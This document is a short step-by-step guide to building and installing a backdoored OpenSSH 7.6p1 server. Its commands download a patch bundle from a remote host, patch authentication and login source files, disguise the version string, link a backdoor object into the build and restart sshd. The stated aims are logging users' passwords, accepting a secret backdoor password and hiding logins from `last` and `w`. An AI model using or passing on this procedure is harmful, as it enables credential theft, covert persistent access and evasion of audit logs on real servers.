1. password logging
2. logon using a backdoor password
3. logon through the patched sshd results in nothing in output from `last` and `w`

#### donwload package
wget https://ftp4.usa.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-7.6p1.tar.gz   
wget https://vps/openssh-7.6p1-patch.tar.gz   

#### copy backdoor files and patch   
cp openssh-7.6p1-patch/backdoor.* openssh-7.6p1   
cd openssh-7.6p1   

patch < backdoor.patch   

patching file auth.c   
patching file auth-pam.c   
patching file auth-passwd.c   
patching file sshconnect2.c   
patching file sshlogin.c   

#### Check and remember version of original openssh   
ssh -V   
OpenSSH_7.6p1, OpenSSL 1.0.2k-fips  26 Jan 2017   

#### Change version.h   
sed -i 's/#define SSH_VERSION\t".*"/#define SSH_VERSION\t"OpenSSH_7.6"/' version.h   
sed -i 's/#define SSH_PORTABLE\t".*"/#define SSH_PORTABLE\t"p1"/' version.h   

#### Install required library   
yum -y install zlib-devel openssl-devel pam-devel   

#### run configure   
#Notice: Confirm the location of the original openssh and configure files installed. It's important for command ./configure --prefix   
./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5   

#### add backdoor.o to Makefile   
sed -i 's/ssh\.o/ssh\.o backdoor\.o/' Makefile   
sed -i 's/sshd\.o/sshd\.o backdoor\.o/' Makefile   

#### compile and install   
make   
make install   

#### restart sshd server   
sed -i 's/Type=.*/Type=fork/'  /lib/systemd/system/sshd.service #if huge when restart sshd   
systemctl daemon-reload #if need   
systemctl restart sshd   

#### view.c show the password record   

